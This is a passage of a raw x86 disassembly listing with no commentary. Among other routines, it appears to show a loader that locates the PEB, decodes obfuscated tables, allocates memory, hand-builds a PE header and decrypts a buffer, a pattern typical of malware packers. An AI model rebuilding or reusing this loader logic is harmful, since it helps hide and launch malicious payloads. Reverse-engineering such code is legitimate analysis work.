  401d68:	8b 55 bc             	mov    -0x44(%ebp),%edx
  401d6b:	66 39 04 51          	cmp    %ax,(%ecx,%edx,2)
  401d6f:	0f 94 c3             	sete   %bl
  401d72:	66 3d 00 00          	cmp    $0x0,%ax
  401d76:	0f 95 c7             	setne  %bh
  401d79:	88 d8                	mov    %bl,%al
  401d7b:	20 f8                	and    %bh,%al
  401d7d:	8b 75 b8             	mov    -0x48(%ebp),%esi
  401d80:	8b 7d c8             	mov    -0x38(%ebp),%edi
  401d83:	39 fe                	cmp    %edi,%esi
  401d85:	0f 92 c7             	setb   %bh
  401d88:	20 f8                	and    %bh,%al
  401d8a:	a8 01                	test   $0x1,%al
  401d8c:	88 5d d7             	mov    %bl,-0x29(%ebp)
  401d8f:	89 75 c4             	mov    %esi,-0x3c(%ebp)
  401d92:	75 8e                	jne    0x401d22
  401d94:	e9 4c ff ff ff       	jmp    0x401ce5
  401d99:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401d9c:	83 c4 44             	add    $0x44,%esp
  401d9f:	5e                   	pop    %esi
  401da0:	5f                   	pop    %edi
  401da1:	5b                   	pop    %ebx
  401da2:	5d                   	pop    %ebp
  401da3:	c3                   	ret
  401da4:	8a 45 b3             	mov    -0x4d(%ebp),%al
  401da7:	a8 01                	test   $0x1,%al
  401da9:	0f 85 19 ff ff ff    	jne    0x401cc8
  401daf:	e9 54 ff ff ff       	jmp    0x401d08
  401db4:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401db7:	66 8b 48 24          	mov    0x24(%eax),%cx
  401dbb:	8b 50 28             	mov    0x28(%eax),%edx
  401dbe:	8b 70 10             	mov    0x10(%eax),%esi
  401dc1:	8b 7d f0             	mov    -0x10(%ebp),%edi
  401dc4:	39 fe                	cmp    %edi,%esi
  401dc6:	0f 94 c3             	sete   %bl
  401dc9:	8a 7d b2             	mov    -0x4e(%ebp),%bh
  401dcc:	20 df                	and    %bl,%bh
  401dce:	f6 c7 01             	test   $0x1,%bh
  401dd1:	89 45 dc             	mov    %eax,-0x24(%ebp)
  401dd4:	66 89 4d ce          	mov    %cx,-0x32(%ebp)
  401dd8:	89 55 c0             	mov    %edx,-0x40(%ebp)
  401ddb:	89 75 d0             	mov    %esi,-0x30(%ebp)
  401dde:	0f 85 14 ff ff ff    	jne    0x401cf8
  401de4:	eb be                	jmp    0x401da4
  401de6:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401de9:	3d 00 00 00 00       	cmp    $0x0,%eax
  401dee:	0f 94 c1             	sete   %cl
  401df1:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401df4:	81 fa 00 00 00 00    	cmp    $0x0,%edx
  401dfa:	0f 95 c5             	setne  %ch
  401dfd:	8b 75 e8             	mov    -0x18(%ebp),%esi
  401e00:	88 4d b3             	mov    %cl,-0x4d(%ebp)
  401e03:	88 6d b2             	mov    %ch,-0x4e(%ebp)
  401e06:	89 75 d8             	mov    %esi,-0x28(%ebp)
  401e09:	eb a9                	jmp    0x401db4
  401e0b:	55                   	push   %ebp
  401e0c:	89 e5                	mov    %esp,%ebp
  401e0e:	56                   	push   %esi
  401e0f:	83 ec 0c             	sub    $0xc,%esp
  401e12:	8b 45 08             	mov    0x8(%ebp),%eax
  401e15:	8b 48 3c             	mov    0x3c(%eax),%ecx
  401e18:	66 89 ca             	mov    %cx,%dx
  401e1b:	66 81 fa 00 00       	cmp    $0x0,%dx
  401e20:	89 c6                	mov    %eax,%esi
  401e22:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401e25:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  401e28:	89 75 f0             	mov    %esi,-0x10(%ebp)
  401e2b:	74 1a                	je     0x401e47
  401e2d:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401e30:	05 ff ff 00 00       	add    $0xffff,%eax
  401e35:	25 ff ff 00 00       	and    $0xffff,%eax
  401e3a:	05 01 00 00 00       	add    $0x1,%eax
  401e3f:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  401e42:	01 c1                	add    %eax,%ecx
  401e44:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  401e47:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401e4a:	83 c4 0c             	add    $0xc,%esp
  401e4d:	5e                   	pop    %esi
  401e4e:	5d                   	pop    %ebp
  401e4f:	c3                   	ret
  401e50:	55                   	push   %ebp
  401e51:	89 e5                	mov    %esp,%ebp
  401e53:	53                   	push   %ebx
  401e54:	56                   	push   %esi
  401e55:	83 ec 7c             	sub    $0x7c,%esp
  401e58:	8b 45 08             	mov    0x8(%ebp),%eax
  401e5b:	89 c1                	mov    %eax,%ecx
  401e5d:	81 c1 20 00 00 00    	add    $0x20,%ecx
  401e63:	8b 50 04             	mov    0x4(%eax),%edx
  401e66:	8b 70 20             	mov    0x20(%eax),%esi
  401e69:	89 34 24             	mov    %esi,(%esp)
  401e6c:	89 54 24 04          	mov    %edx,0x4(%esp)
  401e70:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  401e73:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  401e76:	e8 79 f6 ff ff       	call   0x4014f4
  401e7b:	31 c9                	xor    %ecx,%ecx
  401e7d:	89 45 cc             	mov    %eax,-0x34(%ebp)
  401e80:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  401e83:	eb 73                	jmp    0x401ef8
  401e85:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  401e88:	89 c1                	mov    %eax,%ecx
  401e8a:	83 c1 04             	add    $0x4,%ecx
  401e8d:	8a 90 52 30 40 00    	mov    0x403052(%eax),%dl
  401e93:	8a b0 51 30 40 00    	mov    0x403051(%eax),%dh
  401e99:	8a 98 50 30 40 00    	mov    0x403050(%eax),%bl
  401e9f:	8a b8 4f 30 40 00    	mov    0x40304f(%eax),%bh
  401ea5:	89 45 c0             	mov    %eax,-0x40(%ebp)
  401ea8:	8a 80 13 31 40 00    	mov    0x403113(%eax),%al
  401eae:	8b 75 c0             	mov    -0x40(%ebp),%esi
  401eb1:	8a a6 12 31 40 00    	mov    0x403112(%esi),%ah
  401eb7:	88 45 bf             	mov    %al,-0x41(%ebp)
  401eba:	8a 86 11 31 40 00    	mov    0x403111(%esi),%al
  401ec0:	88 45 be             	mov    %al,-0x42(%ebp)
  401ec3:	8a 86 10 31 40 00    	mov    0x403110(%esi),%al
  401ec9:	28 f8                	sub    %bh,%al
  401ecb:	8a 7d be             	mov    -0x42(%ebp),%bh
  401ece:	28 df                	sub    %bl,%bh
  401ed0:	28 f4                	sub    %dh,%ah
  401ed2:	8a 75 bf             	mov    -0x41(%ebp),%dh
  401ed5:	28 d6                	sub    %dl,%dh
  401ed7:	88 74 35 dd          	mov    %dh,-0x23(%ebp,%esi,1)
  401edb:	88 64 35 dc          	mov    %ah,-0x24(%ebp,%esi,1)
  401edf:	88 7c 35 db          	mov    %bh,-0x25(%ebp,%esi,1)
  401ee3:	88 44 35 da          	mov    %al,-0x26(%ebp,%esi,1)
  401ee7:	81 f9 14 00 00 00    	cmp    $0x14,%ecx
  401eed:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  401ef0:	0f 84 e8 00 00 00    	je     0x401fde
  401ef6:	eb 8d                	jmp    0x401e85
  401ef8:	8b 45 c8             	mov    -0x38(%ebp),%eax
  401efb:	89 c1                	mov    %eax,%ecx
  401efd:	83 c1 04             	add    $0x4,%ecx
  401f00:	8a 90 52 30 40 00    	mov    0x403052(%eax),%dl
  401f06:	8a b0 51 30 40 00    	mov    0x403051(%eax),%dh
  401f0c:	8a 98 50 30 40 00    	mov    0x403050(%eax),%bl
  401f12:	8a b8 4f 30 40 00    	mov    0x40304f(%eax),%bh
  401f18:	89 45 b8             	mov    %eax,-0x48(%ebp)
  401f1b:	8a 80 f5 30 40 00    	mov    0x4030f5(%eax),%al
  401f21:	8b 75 b8             	mov    -0x48(%ebp),%esi
  401f24:	8a a6 f4 30 40 00    	mov    0x4030f4(%esi),%ah
  401f2a:	88 45 b7             	mov    %al,-0x49(%ebp)
  401f2d:	8a 86 f3 30 40 00    	mov    0x4030f3(%esi),%al
  401f33:	88 45 b6             	mov    %al,-0x4a(%ebp)
  401f36:	8a 86 f2 30 40 00    	mov    0x4030f2(%esi),%al
  401f3c:	28 f8                	sub    %bh,%al
  401f3e:	8a 7d b6             	mov    -0x4a(%ebp),%bh
  401f41:	28 df                	sub    %bl,%bh
  401f43:	28 f4                	sub    %dh,%ah
  401f45:	8a 75 b7             	mov    -0x49(%ebp),%dh
  401f48:	28 d6                	sub    %dl,%dh
  401f4a:	88 74 35 dd          	mov    %dh,-0x23(%ebp,%esi,1)
  401f4e:	88 64 35 dc          	mov    %ah,-0x24(%ebp,%esi,1)
  401f52:	88 7c 35 db          	mov    %bh,-0x25(%ebp,%esi,1)
  401f56:	88 44 35 da          	mov    %al,-0x26(%ebp,%esi,1)
  401f5a:	81 f9 14 00 00 00    	cmp    $0x14,%ecx
  401f60:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  401f63:	0f 84 a8 01 00 00    	je     0x402111
  401f69:	eb 8d                	jmp    0x401ef8
  401f6b:	8b 45 b0             	mov    -0x50(%ebp),%eax
  401f6e:	89 c1                	mov    %eax,%ecx
  401f70:	83 c1 04             	add    $0x4,%ecx
  401f73:	8a 90 52 30 40 00    	mov    0x403052(%eax),%dl
  401f79:	8a b0 51 30 40 00    	mov    0x403051(%eax),%dh
  401f7f:	8a 98 50 30 40 00    	mov    0x403050(%eax),%bl
  401f85:	8a b8 4f 30 40 00    	mov    0x40304f(%eax),%bh
  401f8b:	89 45 ac             	mov    %eax,-0x54(%ebp)
  401f8e:	8a 80 21 31 40 00    	mov    0x403121(%eax),%al
  401f94:	8b 75 ac             	mov    -0x54(%ebp),%esi
  401f97:	8a a6 20 31 40 00    	mov    0x403120(%esi),%ah
  401f9d:	88 45 ab             	mov    %al,-0x55(%ebp)
  401fa0:	8a 86 1f 31 40 00    	mov    0x40311f(%esi),%al
  401fa6:	88 45 aa             	mov    %al,-0x56(%ebp)
  401fa9:	8a 86 1e 31 40 00    	mov    0x40311e(%esi),%al
  401faf:	28 f8                	sub    %bh,%al
  401fb1:	8a 7d aa             	mov    -0x56(%ebp),%bh
  401fb4:	28 df                	sub    %bl,%bh
  401fb6:	28 f4                	sub    %dh,%ah
  401fb8:	8a 75 ab             	mov    -0x55(%ebp),%dh
  401fbb:	28 d6                	sub    %dl,%dh
  401fbd:	88 74 35 dd          	mov    %dh,-0x23(%ebp,%esi,1)
  401fc1:	88 64 35 dc          	mov    %ah,-0x24(%ebp,%esi,1)
  401fc5:	88 7c 35 db          	mov    %bh,-0x25(%ebp,%esi,1)
  401fc9:	88 44 35 da          	mov    %al,-0x26(%ebp,%esi,1)
  401fcd:	81 f9 14 00 00 00    	cmp    $0x14,%ecx
  401fd3:	89 4d b0             	mov    %ecx,-0x50(%ebp)
  401fd6:	0f 84 e3 00 00 00    	je     0x4020bf
  401fdc:	eb 8d                	jmp    0x401f6b
  401fde:	8d 05 14 30 40 00    	lea    0x403014,%eax
  401fe4:	31 c9                	xor    %ecx,%ecx
  401fe6:	89 04 24             	mov    %eax,(%esp)
  401fe9:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  401ff0:	00 
  401ff1:	89 4d a4             	mov    %ecx,-0x5c(%ebp)
  401ff4:	e8 8a fc ff ff       	call   0x401c83
  401ff9:	89 04 24             	mov    %eax,(%esp)
  401ffc:	8b 45 a0             	mov    -0x60(%ebp),%eax
  401fff:	89 44 24 04          	mov    %eax,0x4(%esp)
  402003:	e8 de 04 00 00       	call   0x4024e6
  402008:	31 c9                	xor    %ecx,%ecx
  40200a:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  40200d:	89 42 40             	mov    %eax,0x40(%edx)
  402010:	89 4d b0             	mov    %ecx,-0x50(%ebp)
  402013:	e9 53 ff ff ff       	jmp    0x401f6b
  402018:	8b 45 9c             	mov    -0x64(%ebp),%eax
  40201b:	89 c1                	mov    %eax,%ecx
  40201d:	83 c1 04             	add    $0x4,%ecx
  402020:	8a 90 52 30 40 00    	mov    0x403052(%eax),%dl
  402026:	8a b0 51 30 40 00    	mov    0x403051(%eax),%dh
  40202c:	8a 98 50 30 40 00    	mov    0x403050(%eax),%bl
  402032:	8a b8 4f 30 40 00    	mov    0x40304f(%eax),%bh
  402038:	89 45 98             	mov    %eax,-0x68(%ebp)
  40203b:	8a 80 03 31 40 00    	mov    0x403103(%eax),%al
  402041:	8b 75 98             	mov    -0x68(%ebp),%esi
  402044:	8a a6 02 31 40 00    	mov    0x403102(%esi),%ah
  40204a:	88 45 97             	mov    %al,-0x69(%ebp)
  40204d:	8a 86 01 31 40 00    	mov    0x403101(%esi),%al
  402053:	88 45 96             	mov    %al,-0x6a(%ebp)
  402056:	8a 86 00 31 40 00    	mov    0x403100(%esi),%al
  40205c:	28 f8                	sub    %bh,%al
  40205e:	8a 7d 96             	mov    -0x6a(%ebp),%bh
  402061:	28 df                	sub    %bl,%bh
  402063:	28 f4                	sub    %dh,%ah
  402065:	8a 75 97             	mov    -0x69(%ebp),%dh
  402068:	28 d6                	sub    %dl,%dh
  40206a:	88 74 35 dd          	mov    %dh,-0x23(%ebp,%esi,1)
  40206e:	88 64 35 dc          	mov    %ah,-0x24(%ebp,%esi,1)
  402072:	88 7c 35 db          	mov    %bh,-0x25(%ebp,%esi,1)
  402076:	88 44 35 da          	mov    %al,-0x26(%ebp,%esi,1)
  40207a:	81 f9 14 00 00 00    	cmp    $0x14,%ecx
  402080:	89 4d 9c             	mov    %ecx,-0x64(%ebp)
  402083:	75 93                	jne    0x402018
  402085:	8d 05 14 30 40 00    	lea    0x403014,%eax
  40208b:	31 c9                	xor    %ecx,%ecx
  40208d:	89 04 24             	mov    %eax,(%esp)
  402090:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  402097:	00 
  402098:	89 4d 90             	mov    %ecx,-0x70(%ebp)
  40209b:	e8 e3 fb ff ff       	call   0x401c83
  4020a0:	89 04 24             	mov    %eax,(%esp)
  4020a3:	8b 45 a0             	mov    -0x60(%ebp),%eax
  4020a6:	89 44 24 04          	mov    %eax,0x4(%esp)
  4020aa:	e8 37 04 00 00       	call   0x4024e6
  4020af:	31 c9                	xor    %ecx,%ecx
  4020b1:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  4020b4:	89 42 08             	mov    %eax,0x8(%edx)
  4020b7:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  4020ba:	e9 c6 fd ff ff       	jmp    0x401e85
  4020bf:	8d 05 14 30 40 00    	lea    0x403014,%eax
  4020c5:	31 c9                	xor    %ecx,%ecx
  4020c7:	89 04 24             	mov    %eax,(%esp)
  4020ca:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4020d1:	00 
  4020d2:	89 4d 8c             	mov    %ecx,-0x74(%ebp)
  4020d5:	e8 a9 fb ff ff       	call   0x401c83
  4020da:	89 04 24             	mov    %eax,(%esp)
  4020dd:	8b 45 a0             	mov    -0x60(%ebp),%eax
  4020e0:	89 44 24 04          	mov    %eax,0x4(%esp)
  4020e4:	e8 fd 03 00 00       	call   0x4024e6
  4020e9:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  4020ec:	89 41 14             	mov    %eax,0x14(%ecx)
  4020ef:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4020f2:	8b 10                	mov    (%eax),%edx
  4020f4:	89 14 24             	mov    %edx,(%esp)
  4020f7:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  4020fb:	e8 d4 ef ff ff       	call   0x4010d4
  402100:	b9 01 00 00 00       	mov    $0x1,%ecx
  402105:	89 45 88             	mov    %eax,-0x78(%ebp)
  402108:	89 c8                	mov    %ecx,%eax
  40210a:	83 c4 7c             	add    $0x7c,%esp
  40210d:	5e                   	pop    %esi
  40210e:	5b                   	pop    %ebx
  40210f:	5d                   	pop    %ebp
  402110:	c3                   	ret
  402111:	8d 05 14 30 40 00    	lea    0x403014,%eax
  402117:	31 c9                	xor    %ecx,%ecx
  402119:	89 04 24             	mov    %eax,(%esp)
  40211c:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  402123:	00 
  402124:	89 4d 84             	mov    %ecx,-0x7c(%ebp)
  402127:	e8 57 fb ff ff       	call   0x401c83
  40212c:	8d 4d da             	lea    -0x26(%ebp),%ecx
  40212f:	89 04 24             	mov    %eax,(%esp)
  402132:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  402136:	89 4d a0             	mov    %ecx,-0x60(%ebp)
  402139:	e8 a8 03 00 00       	call   0x4024e6
  40213e:	31 c9                	xor    %ecx,%ecx
  402140:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  402143:	89 02                	mov    %eax,(%edx)
  402145:	89 4d 9c             	mov    %ecx,-0x64(%ebp)
  402148:	e9 cb fe ff ff       	jmp    0x402018
  40214d:	55                   	push   %ebp
  40214e:	89 e5                	mov    %esp,%ebp
  402150:	56                   	push   %esi
  402151:	83 ec 14             	sub    $0x14,%esp
  402154:	8b 45 10             	mov    0x10(%ebp),%eax
  402157:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40215a:	8b 55 08             	mov    0x8(%ebp),%edx
  40215d:	3d 00 00 00 00       	cmp    $0x0,%eax
  402162:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402165:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  402168:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40216b:	74 28                	je     0x402195
  40216d:	31 c0                	xor    %eax,%eax
  40216f:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402172:	88 ca                	mov    %cl,%dl
  402174:	88 55 ef             	mov    %dl,-0x11(%ebp)
  402177:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40217a:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40217d:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  402180:	8a 55 ef             	mov    -0x11(%ebp),%dl
  402183:	88 14 01             	mov    %dl,(%ecx,%eax,1)
  402186:	05 01 00 00 00       	add    $0x1,%eax
  40218b:	8b 75 f8             	mov    -0x8(%ebp),%esi
  40218e:	39 f0                	cmp    %esi,%eax
  402190:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402193:	75 e5                	jne    0x40217a
  402195:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402198:	83 c4 14             	add    $0x14,%esp
  40219b:	5e                   	pop    %esi
  40219c:	5d                   	pop    %ebp
  40219d:	c3                   	ret
  40219e:	55                   	push   %ebp
  40219f:	89 e5                	mov    %esp,%ebp
  4021a1:	56                   	push   %esi
  4021a2:	83 ec 18             	sub    $0x18,%esp
  4021a5:	8b 45 08             	mov    0x8(%ebp),%eax
  4021a8:	31 c9                	xor    %ecx,%ecx
  4021aa:	89 c2                	mov    %eax,%edx
  4021ac:	81 c2 38 00 00 00    	add    $0x38,%edx
  4021b2:	8b 70 38             	mov    0x38(%eax),%esi
  4021b5:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4021bc:	89 74 24 04          	mov    %esi,0x4(%esp)
  4021c0:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4021c3:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  4021c6:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4021c9:	e8 b5 fa ff ff       	call   0x401c83
  4021ce:	3d 00 00 00 00       	cmp    $0x0,%eax
  4021d3:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4021d6:	74 17                	je     0x4021ef
  4021d8:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4021db:	8b 08                	mov    (%eax),%ecx
  4021dd:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4021e0:	03 4a 10             	add    0x10(%edx),%ecx
  4021e3:	8b 75 ec             	mov    -0x14(%ebp),%esi
  4021e6:	89 4e 1c             	mov    %ecx,0x1c(%esi)
  4021e9:	8b 4a 18             	mov    0x18(%edx),%ecx
  4021ec:	89 4e 20             	mov    %ecx,0x20(%esi)
  4021ef:	83 c4 18             	add    $0x18,%esp
  4021f2:	5e                   	pop    %esi
  4021f3:	5d                   	pop    %ebp
  4021f4:	c3                   	ret
  4021f5:	55                   	push   %ebp
  4021f6:	89 e5                	mov    %esp,%ebp
  4021f8:	64 8b 0d 18 00 00 00 	mov    %fs:0x18,%ecx
  4021ff:	89 c8                	mov    %ecx,%eax
  402201:	5d                   	pop    %ebp
  402202:	c3                   	ret
  402203:	55                   	push   %ebp
  402204:	89 e5                	mov    %esp,%ebp
  402206:	53                   	push   %ebx
  402207:	56                   	push   %esi
  402208:	83 ec 14             	sub    $0x14,%esp
  40220b:	8b 45 0c             	mov    0xc(%ebp),%eax
  40220e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402211:	31 d2                	xor    %edx,%edx
  402213:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402216:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  402219:	89 55 ec             	mov    %edx,-0x14(%ebp)
  40221c:	eb 4a                	jmp    0x402268
  40221e:	8b 45 e8             	mov    -0x18(%ebp),%eax
  402221:	89 c1                	mov    %eax,%ecx
  402223:	81 e1 1f 00 00 00    	and    $0x1f,%ecx
  402229:	89 c2                	mov    %eax,%edx
  40222b:	81 c2 ff 00 00 00    	add    $0xff,%edx
  402231:	8b 35 18 40 40 00    	mov    0x404018,%esi
  402237:	8a 1c 0e             	mov    (%esi,%ecx,1),%bl
  40223a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40223d:	8a 3c 01             	mov    (%ecx,%eax,1),%bh
  402240:	28 df                	sub    %bl,%bh
  402242:	88 3c 01             	mov    %bh,(%ecx,%eax,1)
  402245:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402248:	39 c2                	cmp    %eax,%edx
  40224a:	89 55 e8             	mov    %edx,-0x18(%ebp)
  40224d:	72 cf                	jb     0x40221e
  40224f:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402252:	05 01 00 00 00       	add    $0x1,%eax
  402257:	3d ff 00 00 00       	cmp    $0xff,%eax
  40225c:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40225f:	75 07                	jne    0x402268
  402261:	83 c4 14             	add    $0x14,%esp
  402264:	5e                   	pop    %esi
  402265:	5b                   	pop    %ebx
  402266:	5d                   	pop    %ebp
  402267:	c3                   	ret
  402268:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40226b:	8b 0c 85 1c 40 40 00 	mov    0x40401c(,%eax,4),%ecx
  402272:	8b 55 f4             	mov    -0xc(%ebp),%edx
  402275:	39 d1                	cmp    %edx,%ecx
  402277:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40227a:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  40227d:	72 9f                	jb     0x40221e
  40227f:	eb ce                	jmp    0x40224f
  402281:	55                   	push   %ebp
  402282:	89 e5                	mov    %esp,%ebp
  402284:	64 8b 0d 18 00 00 00 	mov    %fs:0x18,%ecx
  40228b:	8b 41 30             	mov    0x30(%ecx),%eax
  40228e:	5d                   	pop    %ebp
  40228f:	c3                   	ret
  402290:	55                   	push   %ebp
  402291:	89 e5                	mov    %esp,%ebp
  402293:	57                   	push   %edi
  402294:	56                   	push   %esi
  402295:	83 ec 34             	sub    $0x34,%esp
  402298:	8b 45 08             	mov    0x8(%ebp),%eax
  40229b:	8b 0d 1c 44 40 00    	mov    0x40441c,%ecx
  4022a1:	8b 50 28             	mov    0x28(%eax),%edx
  4022a4:	81 c1 6a 08 00 00    	add    $0x86a,%ecx
  4022aa:	66 c7 02 4d 5a       	movw   $0x5a4d,(%edx)
  4022af:	c7 42 3c c0 00 00 00 	movl   $0xc0,0x3c(%edx)
  4022b6:	c7 82 c0 00 00 00 50 	movl   $0x4550,0xc0(%edx)
  4022bd:	45 00 00 
  4022c0:	66 c7 82 c4 00 00 00 	movw   $0x14c,0xc4(%edx)
  4022c7:	4c 01 
  4022c9:	66 c7 82 c6 00 00 00 	movw   $0x3,0xc6(%edx)
  4022d0:	03 00 
  4022d2:	66 c7 82 d4 00 00 00 	movw   $0xe0,0xd4(%edx)
  4022d9:	e0 00 
  4022db:	c7 82 e8 00 00 00 a0 	movl   $0xeea0,0xe8(%edx)
  4022e2:	ee 00 00 
  4022e5:	66 c7 82 d8 00 00 00 	movw   $0x10b,0xd8(%edx)
  4022ec:	0b 01 
  4022ee:	89 0d 18 44 40 00    	mov    %ecx,0x404418
  4022f4:	8b 48 40             	mov    0x40(%eax),%ecx
  4022f7:	89 e6                	mov    %esp,%esi
  4022f9:	c7 46 0c 04 00 00 00 	movl   $0x4,0xc(%esi)
  402300:	c7 46 08 00 10 00 00 	movl   $0x1000,0x8(%esi)
  402307:	c7 46 04 00 50 2f 00 	movl   $0x2f5000,0x4(%esi)
  40230e:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  402314:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402317:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40231a:	ff d1                	call   *%ecx
  40231c:	83 ec 10             	sub    $0x10,%esp
  40231f:	89 04 24             	mov    %eax,(%esp)
  402322:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  402325:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  402329:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40232c:	e8 42 f0 ff ff       	call   0x401373
  402331:	31 c0                	xor    %eax,%eax
  402333:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402336:	8b 51 28             	mov    0x28(%ecx),%edx
  402339:	8b 71 50             	mov    0x50(%ecx),%esi
  40233c:	89 14 24             	mov    %edx,(%esp)
  40233f:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  402346:	00 
  402347:	89 74 24 08          	mov    %esi,0x8(%esp)
  40234b:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40234e:	e8 fa fd ff ff       	call   0x40214d
  402353:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402356:	8b 48 3c             	mov    0x3c(%eax),%ecx
  402359:	66 89 cf             	mov    %cx,%di
  40235c:	66 81 ff 00 00       	cmp    $0x0,%di
  402361:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  402364:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  402367:	75 76                	jne    0x4023df
  402369:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40236c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40236f:	8b 51 38             	mov    0x38(%ecx),%edx
  402372:	2b 50 34             	sub    0x34(%eax),%edx
  402375:	8b 75 ec             	mov    -0x14(%ebp),%esi
  402378:	89 34 24             	mov    %esi,(%esp)
  40237b:	89 54 24 04          	mov    %edx,0x4(%esp)
  40237f:	89 45 dc             	mov    %eax,-0x24(%ebp)
  402382:	e8 6d f1 ff ff       	call   0x4014f4
  402387:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40238a:	89 0c 24             	mov    %ecx,(%esp)
  40238d:	8b 55 f4             	mov    -0xc(%ebp),%edx
  402390:	89 54 24 04          	mov    %edx,0x4(%esp)
  402394:	89 45 d8             	mov    %eax,-0x28(%ebp)
  402397:	e8 38 ed ff ff       	call   0x4010d4
  40239c:	31 c9                	xor    %ecx,%ecx
  40239e:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4023a1:	8b 75 ec             	mov    -0x14(%ebp),%esi
  4023a4:	89 72 3c             	mov    %esi,0x3c(%edx)
  4023a7:	c7 42 2c 03 00 00 00 	movl   $0x3,0x2c(%edx)
  4023ae:	c7 42 10 a0 ee 00 00 	movl   $0xeea0,0x10(%edx)
  4023b5:	c7 42 18 00 50 2f 00 	movl   $0x2f5000,0x18(%edx)
  4023bc:	8b 7d dc             	mov    -0x24(%ebp),%edi
  4023bf:	c7 87 cc 00 00 00 00 	movl   $0x0,0xcc(%edi)
  4023c6:	00 00 00 
  4023c9:	c7 87 c8 00 00 00 00 	movl   $0x0,0xc8(%edi)
  4023d0:	00 00 00 
  4023d3:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4023d6:	89 c8                	mov    %ecx,%eax
  4023d8:	83 c4 34             	add    $0x34,%esp
  4023db:	5e                   	pop    %esi
  4023dc:	5f                   	pop    %edi
  4023dd:	5d                   	pop    %ebp
  4023de:	c3                   	ret
  4023df:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4023e2:	05 ff ff 00 00       	add    $0xffff,%eax
  4023e7:	25 ff ff 00 00       	and    $0xffff,%eax
  4023ec:	05 01 00 00 00       	add    $0x1,%eax
  4023f1:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4023f4:	01 c1                	add    %eax,%ecx
  4023f6:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  4023f9:	e9 6b ff ff ff       	jmp    0x402369
  4023fe:	55                   	push   %ebp
  4023ff:	89 e5                	mov    %esp,%ebp
  402401:	83 ec 08             	sub    $0x8,%esp
  402404:	8b 45 08             	mov    0x8(%ebp),%eax
  402407:	8b 48 50             	mov    0x50(%eax),%ecx
  40240a:	8b 40 28             	mov    0x28(%eax),%eax
  40240d:	89 04 24             	mov    %eax,(%esp)
  402410:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  402414:	e8 ea fd ff ff       	call   0x402203
  402419:	31 c0                	xor    %eax,%eax
  40241b:	83 c4 08             	add    $0x8,%esp
  40241e:	5d                   	pop    %ebp
  40241f:	c3                   	ret
  402420:	55                   	push   %ebp
  402421:	89 e5                	mov    %esp,%ebp
  402423:	57                   	push   %edi
  402424:	56                   	push   %esi
  402425:	83 ec 10             	sub    $0x10,%esp
  402428:	8b 45 10             	mov    0x10(%ebp),%eax
